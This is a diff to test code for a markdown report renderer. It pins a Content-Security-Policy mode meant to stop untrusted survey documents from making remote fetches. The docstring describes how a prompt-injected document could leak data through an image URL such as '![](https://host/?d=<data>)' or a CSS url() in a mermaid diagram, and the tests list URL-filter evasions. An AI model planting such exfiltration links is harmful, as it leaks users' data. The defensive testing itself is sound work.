@@ -131,9 +131,12 @@ class TestBuildHtml:
         assert "<title>a<b>" not in html
 
     @pytest.mark.parametrize(
-        "marker", ["__MD_B64__", "__MERMAID_SRC__", "__MARKED_SRC__"]
+        "marker", ["__MD_B64__", "__MERMAID_SRC__", "__MARKED_SRC__", "__CSP_META__"]
     )
-    def test_a_title_that_spells_a_placeholder_is_not_expanded(self, marker):
+    @pytest.mark.parametrize("block_remote", [False, True])
+    def test_a_title_that_spells_a_placeholder_is_not_expanded(
+        self, marker, block_remote
+    ):
         """The title is substituted LAST, so it can never become a placeholder.
 
         html.escape leaves underscores alone, so a heading like `# __MD_B64__`
@@ -141,10 +144,172 @@ class TestBuildHtml:
         URL) by any substitution that ran after it.
         """
         html = render_report.build_html(
-            "# r\n", title=marker, assets=render_report.CDN_ASSETS
+            "# r\n",
+            title=marker,
+            assets=render_report.CDN_ASSETS,
+            block_remote=block_remote,
         )
         assert f"<title>{marker}</title>" in html
         assert decode_embedded_markdown(html) == "# r\n"
+
+
+def csp_directives(html: str) -> dict[str, list[str]]:
+    """Parse the page's meta CSP into {directive: [source, ...]}."""
+    match = re.search(
+        r'<meta http-equiv="Content-Security-Policy" content="([^"]*)">', html
+    )
+    assert match, "generated page carries no CSP meta"
+    directives: dict[str, list[str]] = {}
+    for part in match.group(1).split(";"):
+        tokens = part.split()
+        if tokens:
+            directives[tokens[0]] = tokens[1:]
+    return directives
+
+
+class TestBlockRemote:
+    """--block-remote: pages written from untrusted sources (codebase-survey).
+
+    A prompt-injected document could carry `![](https://host/?d=<data>)`, or
+    a CSS url() inside a mermaid diagram, which mermaid inserts after the
+    scrub has run. Fetch directives are enforced by the browser at load time,
+    whoever created the element, which an attribute scrub cannot match.
+    """
+
+    def test_the_default_page_carries_no_csp(self):
+        # session-report and doc-browser's README previews keep their remote
+        # images (badges and the like): the restriction is opt-in only.
+        html = render_report.build_html(
+            "# r\n", title="t", assets=render_report.CDN_ASSETS
+        )
+        assert "Content-Security-Policy" not in html
+        assert "x-dns-prefetch-control" not in html
+
+    def test_the_csp_comes_before_anything_that_loads(self):
+        html = render_report.build_html(
+            "# r\n", title="t", assets=render_report.CDN_ASSETS, block_remote=True
+        )
+        assert html.index("Content-Security-Policy") < html.index("<script")
+        assert html.index("Content-Security-Policy") < html.index("<style")
+
+    def test_fetches_are_limited_to_local_files(self):
+        csp = csp_directives(
+            render_report.build_html(
+                "# r\n", title="t", assets=render_report.CDN_ASSETS, block_remote=True
+            )
+        )
+        assert set(csp["img-src"]) <= {"file:", "data:"}
+        assert set(csp["font-src"]) <= {"file:", "data:"}
+        # Inline styles are needed by the page and by mermaid's SVG; external
+        # stylesheets (a remote @import) are not.
+        assert set(csp["style-src"]) == {"'unsafe-inline'", "file:"}
+        for directive in (
+            "media-src",
+            "connect-src",
+            "frame-src",
+            "object-src",
+            "worker-src",
+            "form-action",
+            "base-uri",
+            # Inline event handlers: the scrub already removes on* attributes,
+            # and neither the page nor mermaid (securityLevel strict) uses them.
+            "script-src-attr",
+        ):
+            assert csp[directive] == ["'none'"], directive
+
+    def test_scripts_are_left_alone(self):
+        # Not script-src, and not default-src (which would fall back onto
+        # scripts): the CDN libraries and the inline script must keep running.
+        # Locking scripts down is a separate hardening.
+        csp = csp_directives(
+            render_report.build_html(
+                "# r\n", title="t", assets=render_report.CDN_ASSETS, block_remote=True
+            )
+        )
+        assert "script-src" not in csp
+        assert "default-src" not in csp
+
+    def test_dns_prefetch_of_link_hosts_is_off(self):
+        html = render_report.build_html(
+            "# r\n", title="t", assets=render_report.CDN_ASSETS, block_remote=True
+        )
+        assert '<meta http-equiv="x-dns-prefetch-control" content="off">' in html
+
+    def test_blocked_loads_are_reported_on_the_page(self):
+        html = render_report.build_html(
+            "# r\n", title="t", assets=render_report.CDN_ASSETS, block_remote=True
+        )
+        # Listening before the marked check and the content insertion below
+        # it, or the first violations would go uncounted.
+        listener = html.index('addEventListener("securitypolicyviolation"')
+        assert listener < html.index('typeof window.marked === "undefined"')
+        assert listener < html.index("content.replaceChildren(")
+
+    @pytest.mark.parametrize(
+        ("name", "blocked"),
+        [
+            ("20261105-120000-survey-dotfiles.md", True),
+            ("20261105-120000-survey-dotfiles-nvim-lsp.md", True),
+            ("20261105-120000-add-survey-skill.md", False),
+            ("20261105-120000-survey-foo_bar.md", False),
+            ("README.md", False),
+        ],
+    )
+    def test_a_survey_named_markdown_is_blocked_without_the_flag(
+        self, tmp_path, name, blocked
+    ):
+        # The skill passes --block-remote, but a prompt-injected run may not:
+        # the file name doc-browser lists as 調査 turns it on regardless.
+        md = tmp_path / name
+        md.write_text("# r\n", encoding="utf-8")
+        page = render_report.render(md, open_browser=False).read_text(encoding="utf-8")
+        assert ("Content-Security-Policy" in page) is blocked
+
+    def test_the_survey_name_rule_matches_session_dossier(self, monkeypatch):
+        # The same rule lives in three places (here, dossier_scope.py and
+        # doc-browser's catalog.ts); the two Python copies are pinned equal.
+        monkeypatch.syspath_prepend(str(REPO_ROOT / ".claude/skills/session-dossier"))
+        import dossier_scope
+
+        assert (
+            render_report._SURVEY_MARKDOWN.pattern
+            == dossier_scope._SURVEY_MARKDOWN.pattern
+        )
+
+    def test_doc_browser_recognises_exactly_this_head(self):
+        # doc-browser opens a survey's HTML as-is only when the page starts
+        # with these two constants from hooks/paths.ts, character for
+        # character; otherwise it re-renders the markdown. Pin them to what
+        # this renderer writes, so neither side can drift alone.
+        ts = (REPO_ROOT / ".claude/mods/doc-browser/hooks/paths.ts").read_text(
+            encoding="utf-8"
+        )
+        head = re.search(r"export const RENDERED_HEAD =\s*'([^']*)';", ts)
+        meta = re.search(r"export const BLOCK_REMOTE_CSP_META =\s*`([^`]*)`;", ts)
+        assert head and meta, "paths.ts no longer defines the two constants"
+        expected = head.group(1).replace("\\n", "\n") + meta.group(1) + "\n"
+
+        blocked = render_report.build_html(
+            "# r\n", title="t", assets=render_report.CDN_ASSETS, block_remote=True
+        )
+        plain = render_report.build_html(
+            "# r\n", title="t", assets=render_report.CDN_ASSETS
+        )
+        assert blocked.startswith(expected)
+        assert not plain.startswith(expected)
+
+    def test_cli_threads_the_flag(self, tmp_path):
+        md = tmp_path / "r.md"
+        md.write_text("# r\n![x](https://example.invalid/x.png)\n", encoding="utf-8")
+
+        assert render_report.main(["--no-open", "--block-remote", str(md)]) == 0
+        assert "Content-Security-Policy" in (tmp_path / "r.html").read_text(
+            encoding="utf-8"
+        )
+        assert render_report.main(["--no-open", str(md)]) == 0
+        assert "Content-Security-Policy" not in (tmp_path / "r.html").read_text(
+            encoding="utf-8"
+        )
 
 
 class TestExtractTitle:
@@ -377,6 +542,13 @@ class TestEmbeddedScript:
             ("./20260102-030405-dossier-11111111.html#tu-toolu_01Ab", True),
             ("/absolute/path", True),
             ("", True),
+            # Two leading slashes (either way round) name a host: on a file://
+            # page `//host/x` becomes file://host/x, a network share on Windows.
+            ("//example.com/x.png", False),
+            ("\\\\example.com\\x.png", False),
+            ("/\\example.com/x.png", False),
+            ("\\/example.com/x.png", False),
+            (" //example.com/x.png", False),
         ],
     )
     def test_url_scheme_filter_rejects_known_evasions(self, tmp_path, url, safe):
